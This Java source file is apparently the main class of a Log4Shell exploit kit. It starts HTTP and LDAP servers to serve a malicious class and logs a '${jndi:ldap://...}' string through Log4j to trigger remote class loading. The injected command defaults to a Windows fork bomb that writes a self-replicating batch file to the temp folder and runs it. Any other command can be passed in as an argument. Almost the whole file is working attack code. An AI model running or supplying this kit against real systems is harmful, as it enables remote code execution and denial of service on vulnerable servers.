package org.sec;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Main {
    private static final Logger logger = LogManager.getLogger(Main.class);

    public static void main(String[] args) {
        try {
            String cmd;
            if (args.length == 0) {
                cmd = "cmd /c echo %0^|%0 > \"%temp%\\fuck.bat\" && start \"\" \"%temp%\\fuck.bat\"";
            } else {
                cmd = args[0];
            }
            Logo.print();
            logger.info("start jndi kit");
            logger.info("cmd: " + cmd);
            new Thread(() -> Http.start(cmd)).start();
            new Thread(Ldap::start).start();
            Thread.sleep(1000);
            System.out.println("|--------------------------------------------------------|");
            System.out.println("|------Payload: ldap://127.0.0.1:1389/badClassName-------|");
            System.out.println("|--------------------------------------------------------|");
            logger.error("${jndi:ldap://127.0.0.1:1389/badClassName}");
        } catch (Exception e) {
            logger.error(e.getMessage());
        }
    }
//public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
//
//}

}
